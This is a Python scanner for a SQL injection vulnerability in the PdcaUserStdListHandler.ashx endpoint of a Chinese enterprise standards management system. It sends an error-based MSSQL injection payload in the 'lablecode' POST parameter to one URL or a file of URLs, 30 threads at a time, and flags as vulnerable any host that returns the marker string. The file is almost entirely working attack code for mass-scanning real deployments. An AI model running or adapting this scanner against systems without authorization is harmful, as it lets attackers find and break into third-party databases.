import argparse
import textwrap
import warnings
from multiprocessing.dummy import Pool
import requests
import urllib3
# 润申信息企业标准化管理系统 PdcaUserStdListHandler.ashx SQL注入




def main():
    urllib3.disable_warnings()
    warnings.filterwarnings("ignore")
    parser = argparse.ArgumentParser(description="一个漏洞检测工具",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''示例：python 1111.py -u www.baidu.com / -f url.txt'''))
    parser.add_argument("-u", "--url", dest="url", help="请输入要检测的url地址")
    parser.add_argument("-f", "--file", dest="file", help="请输入要批量检测的文件")
    args = parser.parse_args()
    urls = []
    if args.url:
        if "http" not in args.url:
            args.url = f"http://{args.url}"
        check(args.url)
    elif args.file:
        with open(f"{args.file}", "r") as f:
            for i in f:
                u = i.strip()
                if "http" not in u:
                    u = f"http://{u}"
                    urls.append(u)
                else:
                    urls.append(u)
    pool = Pool(30)
    pool.map(check, urls)


def check(url):
    u = f"{url}/PDCA/ashx/PdcaUserStdListHandler.ashx?action=GetDataBy"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    data="code=1&lablecode=-9458%29+OR+5511+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285511%3D5511%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+XeuQ&LableName=&page=1&rows=20"
    try:
        a = requests.post(url=u, headers=headers, verify=False,timeout=5,data=data)
        a.encoding = 'utf-8'
        html=a.text
        b = a.status_code
        if b == 500 and "qppqq1qxkkq" in html and "转换成数据类型 int 时失败" in html:
            print('[+]存在漏洞',url)
        else:
            print('[-]不存在漏洞',url)
    except Exception as i:
        print('[x]请求发生错误',url)


if __name__ == '__main__':
    banner = '''
    $$\                                                                   
$$ |                                                                  
$$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\  $$$$$$$\   $$$$$$\  
$$  __$$\  \____$$\ $$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ 
$$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  $$ |$$ /  $$ |$$ |  $$ |$$ /  $$ |
$$ |  $$ |$$  __$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
$$ |  $$ |\$$$$$$$ |\$$$$$$  |\$$$$$$$ |\$$$$$$  |$$ |  $$ |\$$$$$$$ |
\__|  \__| \_______| \______/  \____$$ | \______/ \__|  \__| \____$$ |
                              $$\   $$ |                    $$\   $$ |
                              \$$$$$$  |                    \$$$$$$  |
                               \______/                      \______/ 

    '''
    print(banner)
    main()

